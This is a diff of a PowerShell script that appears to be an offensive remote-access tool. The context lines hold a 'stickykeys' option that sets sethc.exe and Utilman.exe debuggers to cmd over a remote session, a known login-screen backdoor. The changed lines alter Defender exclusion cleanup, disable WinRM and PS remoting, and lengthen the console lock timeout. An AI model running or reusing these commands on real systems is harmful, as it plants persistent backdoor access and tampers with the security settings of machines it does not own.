@@ -68,7 +68,9 @@ function Remove-Exclusions {
     $exclusion = Get-MpPreference ; $exclusion.exclusionprocess | % { Remove-MpPreference -ExclusionProcess $_ 2>&1> $null }
     $exclusion = Get-MpPreference ; $exclusion.exclusionpath | % { Remove-MpPreference -ExclusionPath $_ 2>&1> $null }
     $exclusion = Get-MpPreference ; $exclusion.exclusionextension | % { Remove-MpPreference -ExclusionExtension $_ 2>&1> $null }
-    Set-MpPreference -DisableIOAVProtection 0 2>&1> $null } 
+    Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Disable-PSRemoting -Force 2>&1> $null ; Clear-Item -Path WSMan:localhostClientTrustedHosts -Force 2>&1> $null
+    Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system -Name LocalAccountTokenFilterPolicy -Value 0 -Force 2>&1> $null
+    Stop-Service WinRM 2>&1> $null ; Set-Service WinRM -StartupType Disabled 2>&1> $null ; Remove-Item -Path WSMan:\Localhost\listener\listener* -Recurse -Force 2>&1> $null } 
 
     do { Show-Banner ; Show-Language
     $help = 'The detailed guide of use can be found at the following link:'
@@ -555,7 +557,7 @@ if($Language -in 'Spanish') {
     if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock {
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
-    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\7516b95f-f776-4464-8c53-06167f40cc99\8EC4B3A5-6868-48c2-BE75-4F3044BE88A7" /v Attributes /t REG_DWORD /d 1 /f 2>&1> $null }}
+    powercfg /setacvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null ; powercfg /setdcvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null }}
 
         if($version -Like '*Server*') { Write-Host "$version $txt34" -ForegroundColor Red
         invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
